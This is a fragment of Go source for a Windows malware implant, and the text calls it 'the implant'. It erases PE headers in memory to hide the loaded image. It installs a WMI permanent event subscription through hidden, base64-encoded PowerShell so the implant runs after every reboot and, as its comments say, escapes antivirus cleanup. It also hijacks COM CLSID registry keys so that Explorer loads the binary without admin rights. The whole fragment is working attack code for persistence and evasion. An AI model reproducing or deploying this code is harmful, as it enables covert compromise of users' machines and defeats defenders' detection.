	// Zero MZ signature
	hdr[0] = 0
	hdr[1] = 0
	// Zero PE signature at e_lfanew
	if hdr[0x3C] < 0xF0 {
		poff := int(hdr[0x3C])
		if poff+4 < 4096 {
			hdr[poff] = 0
			hdr[poff+1] = 0
		}
	}
	vp.Call(base, 4096, uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
}

// ── WMI Permanent Event Subscription persistence ─────────────────────────────

// winWMIPersist creates a WMI permanent event subscription that re-executes
// the implant ~4 minutes after every reboot.  WMI subscriptions survive user
// logoff, are not shown in schtasks, and are rarely cleaned by AV.
func winWMIPersist(exePath string) {
	// Language: WQL / CommandLineEventConsumer
	script := fmt.Sprintf(`$f=Set-WmiInstance -Ns root\subscription -Class __EventFilter `+
		`-Arguments @{Name='WinSysFilter';EventNameSpace='root\cimv2';QueryLanguage='WQL';`+
		`Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};`+
		`$c=Set-WmiInstance -Ns root\subscription -Class CommandLineEventConsumer `+
		`-Arguments @{Name='WinSysConsumer';CommandLineTemplate='%s'};`+
		`Set-WmiInstance -Ns root\subscription -Class __FilterToConsumerBinding `+
		`-Arguments @{Filter=$f;Consumer=$c}`, exePath)
	cmd := exec.Command("powershell", "-nop", "-w", "hidden", "-enc",
		winB64(script))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}

// winB64 base64-encodes a PowerShell script for -enc use (UTF-16LE).
func winB64(s string) string {
	// Encode as UTF-16 LE
	utf16 := make([]byte, len(s)*2)
	for i, c := range s {
		utf16[i*2] = byte(c)
		utf16[i*2+1] = 0
	}
	// base64
	const b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	n := len(utf16)
	out := make([]byte, (n+2)/3*4)
	j := 0
	for i := 0; i < n; i += 3 {
		b0 := utf16[i]
		b1 := byte(0)
		b2 := byte(0)
		if i+1 < n { b1 = utf16[i+1] }
		if i+2 < n { b2 = utf16[i+2] }
		out[j]   = b64chars[(b0>>2)&0x3F]
		out[j+1] = b64chars[((b0&0x03)<<4)|(b1>>4)]
		out[j+2] = b64chars[((b1&0x0F)<<2)|(b2>>6)]
		out[j+3] = b64chars[b2&0x3F]
		j += 4
	}
	pad := (3 - n%3) % 3
	for p := 0; p < pad; p++ {
		out[len(out)-1-p] = '='
	}
	return string(out)
}

// ── COM key hijacking ─────────────────────────────────────────────────────────

// winCOMHijack plants a HKCU CLSID InprocServer32 key for COM classes that are
// commonly loaded by Explorer and Windows Update.  No admin required.
// When the host application loads these CLSIDs, our binary is executed in-process.
func winCOMHijack(exePath string) {
	// These CLSIDs are loaded by Explorer on startup / right-click menus.
	// Planting them in HKCU overrides the HKLM registration without needing UAC.
	targets := []string{
		// Windows Script Host Shell Object — loaded by many installers
		`HKCU\Software\Classes\CLSID\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\InprocServer32`,
		// Windows Image Acquisition Automation — loaded by imaging apps
		`HKCU\Software\Classes\CLSID\{8AC18BAB-19E7-4A2C-B7C4-05E6A0A14E23}\InprocServer32`,
	}
	for _, key := range targets {
		if exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exePath, "/f").Run() == nil {
			// Also set ThreadingModel so it loads in the host's thread
			_ = exec.Command("reg", "add", key, "/v", "ThreadingModel",
				"/t", "REG_SZ", "/d", "Apartment", "/f").Run()
		}
	}
}
